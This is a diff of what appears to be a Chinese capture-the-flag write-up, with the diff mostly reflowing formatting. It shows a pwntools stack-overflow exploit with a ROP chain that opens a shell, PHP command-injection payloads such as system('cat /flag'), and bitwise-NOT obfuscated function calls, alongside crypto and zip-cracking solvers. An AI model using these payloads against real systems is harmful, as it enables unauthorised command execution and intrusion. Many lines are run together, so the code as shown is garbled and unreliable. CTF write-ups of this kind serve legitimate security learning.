@@ -19,7 +19,8 @@ int main() { int i,image,buf;
  srand(0x2a); for(i=0;i<=50;i++){ image=rand()%3; if(image==0) printf("2n"); if(image==1) printf("0n"); if(image==2) printf("1n");
  }}
 
-expfrom pwn import *r=process('./stack')#本地连接程序#r = remote('112.6.51.212',30189)#连接远程
+exp
+from pwn import *r=process('./stack')#本地连接程序#r = remote('112.6.51.212',30189)#连接远程
 
 payload=b'a'*0x78+p64(0x00000000004007e3)+p64(0x400808)+p64(0x40073B)#攻击链r.sendlineafter(b"overflowsnn",payload)#接收发送攻击链r.interactive()#直接进行交互，相当于回到shell的模式
 
@@ -47,7 +48,8 @@ m = gmpy2.powmod(c, d, n)
 
 print(libnum.n2s(int(m)).decode())
 
-import gmpy2import libnumdef isqrt(n): x = n y = (x + n // x) // 2 while y < x: x = y y = (x + n // x) // 2 return x
+import gmpy2import libnum
+def isqrt(n): x = n y = (x + n // x) // 2 while y < x: x = y y = (x + n // x) // 2 return x
 def fermat(n, verbose=True): a = isqrt(n) b2 = a*a - n b = isqrt(n) count = 0 while b*b != b2: a = a + 1 b2 = a*a - n b = isqrt(b2) count += 1 p=a+b q=a-b assert n == p * q print('p=',p) print('q=',q) return p, qn= 9902818856222787024563072133440550938710227558135328161789597975061589956056992262033542077154303618976791004431333531566549039602180273711537029693586182757724092450368200557073359408363479337363507885859556647468887536468774671586957716873885078043767796679063965432886918774554067185434296238290330438435760966311141004960151482088020397079850490003346872012237936581379969498669060779635164715522140773054302161538487178356007181001168935521820750705451939658389744968102068056144618223821116178519113949752796472136437303624285646057868957254876748746072125760376198949315110236060132257629082612239437688267817e= 65537c= 5159074368161541220237618453546581685955484179084194024992550056500438408178271386314960904546540848345370535310245598908803315809660211277776672289921238267645740671269916277896450223256967608644746977632342909627272084837606715644342530689351173316353848189214669987733795167033379669336141047211939013874739278870794953469189661132687676706346507396405946492642648897990248958917013256337570746910017175346336103441528515091504265815800116946786279239756724184064237114695548319993781206797074067095779971390244729292540495903352355048685746842568533136142923146303443882436592305037659264720790923302870859093878pq=fermat(n)p=pq[0]q=pq[1]phi_n=(p-1)*(q-1)d=gmpy2.invert(e,phi_n)m=pow(c,d,n)print(m)print(libnum.n2s(int(m)).decode())
 
 浪费您一秒时间
@@ -58,9 +60,9 @@ def fermat(n, verbose=True): a = isqrt(n) b2 = a*a - n b = isqrt(n) count = 0 wh
 
 
 ```
-#define _crt_secure_no_warnings
-#include<stdio.h>
-#include<string.h>
+    #define _crt_secure_no_warnings
+    #include<stdio.h>
+    #include<string.h>
 
 int main()
 {
@@ -74,86 +76,32 @@ int main()
 
  return 0;
 }
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>
+    #include <stdio.h>#include <stdlib.h>
 int main() { int i,image,buf;
  srand(0x22); for(i=0;i<=11;i++){ image=rand()%3; printf("%d ",image);
  }}
-```
-
-
-
-```
-#include <stdio.h>#include <stdlib.h>
+    #include <stdio.h>#include <stdlib.h>
 int main() { int i,image,buf;
  srand(0x2a); for(i=0;i<=50;i++){ image=rand()%3; if(image==0) printf("2n"); if(image==1) printf("0n"); if(image==2) printf("1n");
  }}
-```
-
-
-
-```
-expfrom pwn import *r=process('./stack')#本地连接程序#r = remote('112.6.51.212',30189)#连接远程
+exp
+from pwn import *r=process('./stack')#本地连接程序#r = remote('112.6.51.212',30189)#连接远程
 
 payload=b'a'*0x78+p64(0x00000000004007e3)+p64(0x400808)+p64(0x40073B)#攻击链r.sendlineafter(b"overflowsnn",payload)#接收发送攻击链r.interactive()#直接进行交互，相当于回到shell的模式
-```
-
-
-
-```
 payload:/?p=system('ls /'); //查看文件目录
    /?p=system('cat /flag');     //读文件内容
-```
-
-
-
-```
 知识点:
 request方法传参既能用get也能用post传
-```
-
-
-
-```
 <?php
 echo urlencode(~'phpinfo');
 ?>
-```
-
-
-
-```
 ?cmd=(~%8C%86%8C%8B%9A%92)(~%93%8C);
 ?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);
-```
-
-
-
-```
 import pyzipperimport os
 def extract_nested_zip(zip_file): with pyzipper.AESZipFile(zip_file, 'r') as zipf: password_filename = None for file_info in zipf.filelist: if file_info.filename.startswith('password_'): password_filename = file_info.filename break if password_filename is None: print(f'未找到密码文件，无法解密压缩包 "{zip_file}"。') return with zipf.open(password_filename) as pwd_file: password = pwd_file.read().decode() with pyzipper.AESZipFile(zip_file, 'r', encryption=pyzipper.WZ_AES) as inner_zipf: for file_info in inner_zipf.filelist: inner_zipf.extract(file_info, path='.', pwd=password.encode()) print(f'已解压文件: {file_info.filename}') next_zip_filename = None for file_info in inner_zipf.filelist: if file_info.filename.endswith('.zip'): next_zip_filename = file_info.filename break if next_zip_filename: extract_nested_zip(next_zip_filename)
 if __name__ == '__main__': outermost_zip_file = 'manyzip_499.zip' extract_nested_zip(outermost_zip_file)
-```
-
-
-
-```
 原理很简单，有了1，2，4，8这四个简单的数字，你可以以加法表示出0-9任何一个数字，例如0=28，7=124，9=18。这样，再用1-26来表示A-Z，就可以用作密码了。为了不至于混乱，引用了第五个数字0，来用作间隔，以避免翻译错误，所以还可以称“01248密码”。
-```
-
-
-
-```
 a="120222480111222448011224240112448014224201222201844201422084204242242012202224802120184420881210122408240124"s=a.split('0')print(s)l=[]for i in s: sum=0 for j in i: sum+=eval(j) l.append(chr(sum+64))print(''.join(l))
-```
-
-
-
-```
 import libnum
 import gmpy2
 
@@ -169,12 +117,8 @@ d = gmpy2.invert(e, phi)
 m = gmpy2.powmod(c, d, n)
 
 print(libnum.n2s(int(m)).decode())
-```
-
-
-
-```
-import gmpy2import libnumdef isqrt(n): x = n y = (x + n // x) // 2 while y < x: x = y y = (x + n // x) // 2 return x
+import gmpy2import libnum
+def isqrt(n): x = n y = (x + n // x) // 2 while y < x: x = y y = (x + n // x) // 2 return x
 def fermat(n, verbose=True): a = isqrt(n) b2 = a*a - n b = isqrt(n) count = 0 while b*b != b2: a = a + 1 b2 = a*a - n b = isqrt(b2) count += 1 p=a+b q=a-b assert n == p * q print('p=',p) print('q=',q) return p, qn= 9902818856222787024563072133440550938710227558135328161789597975061589956056992262033542077154303618976791004431333531566549039602180273711537029693586182757724092450368200557073359408363479337363507885859556647468887536468774671586957716873885078043767796679063965432886918774554067185434296238290330438435760966311141004960151482088020397079850490003346872012237936581379969498669060779635164715522140773054302161538487178356007181001168935521820750705451939658389744968102068056144618223821116178519113949752796472136437303624285646057868957254876748746072125760376198949315110236060132257629082612239437688267817e= 65537c= 5159074368161541220237618453546581685955484179084194024992550056500438408178271386314960904546540848345370535310245598908803315809660211277776672289921238267645740671269916277896450223256967608644746977632342909627272084837606715644342530689351173316353848189214669987733795167033379669336141047211939013874739278870794953469189661132687676706346507396405946492642648897990248958917013256337570746910017175346336103441528515091504265815800116946786279239756724184064237114695548319993781206797074067095779971390244729292540495903352355048685746842568533136142923146303443882436592305037659264720790923302870859093878pq=fermat(n)p=pq[0]q=pq[1]phi_n=(p-1)*(q-1)d=gmpy2.invert(e,phi_n)m=pow(c,d,n)print(m)print(libnum.n2s(int(m)).decode())
 ```
 
